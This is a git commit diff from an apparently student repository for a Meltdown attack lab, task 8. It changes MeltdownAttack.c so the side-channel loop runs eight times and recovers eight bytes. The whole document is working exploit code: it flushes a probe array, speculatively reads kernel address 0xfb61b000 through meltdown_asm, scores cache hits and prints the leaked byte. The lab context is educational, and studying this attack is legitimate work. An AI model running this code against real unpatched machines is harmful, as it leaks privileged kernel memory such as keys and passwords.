479b45b7bcdbb1a8590353187dc67552e1f3d62e
Guo Jiaming <804436395@qq.com>
2023-01-31 19:25:15 +0800

    update Meltdown Attack task 8 code

--- Meltdown Attack Lab/code/MeltdownAttack.c
+++ Meltdown Attack Lab/code/MeltdownAttack.c
@@ -83,36 +83,37 @@ int main()
     perror("open");
     return -1;
   }
-  
-  memset(scores, 0, sizeof(scores));
-  flushSideChannel();
-  
-	  
-  // Retry 1000 times on the same address.
-  for (i = 0; i < 1000; i++) {
-	ret = pread(fd, NULL, 0, 0);
-	if (ret < 0) {
-	  perror("pread");
-	  break;
+	for(int k=0;k<8;k++)
+	{
+		  memset(scores, 0, sizeof(scores));
+		  flushSideChannel();
+		  
+			  
+		  // Retry 1000 times on the same address.
+		  for (i = 0; i < 1000; i++) {
+			ret = pread(fd, NULL, 0, 0);
+			if (ret < 0) {
+			  perror("pread");
+			  break;
+			}
+			
+			// Flush the probing array
+			for (j = 0; j < 256; j++) 
+				_mm_clflush(&array[j * 4096 + DELTA]);
+
+			if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xfb61b000); }
+
+			reloadSideChannelImproved();
+		  }
+
+		  // Find the index with the highest score.
+		  int max = 0;
+		  for (i = 0; i < 256; i++) {
+			if (scores[max] < scores[i]) max = i;
+		  }
+
+		  printf("The secret value is %d %c\n", max, max);
+		  printf("The number of hits is %d\n", scores[max]);
 	}
-	
-	// Flush the probing array
-	for (j = 0; j < 256; j++) 
-		_mm_clflush(&array[j * 4096 + DELTA]);
-
-	if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xfb61b000); }
-
-	reloadSideChannelImproved();
-  }
-
-  // Find the index with the highest score.
-  int max = 0;
-  for (i = 0; i < 256; i++) {
-	if (scores[max] < scores[i]) max = i;
-  }
-
-  printf("The secret value is %d %c\n", max, max);
-  printf("The number of hits is %d\n", scores[max]);
-
   return 0;
 }
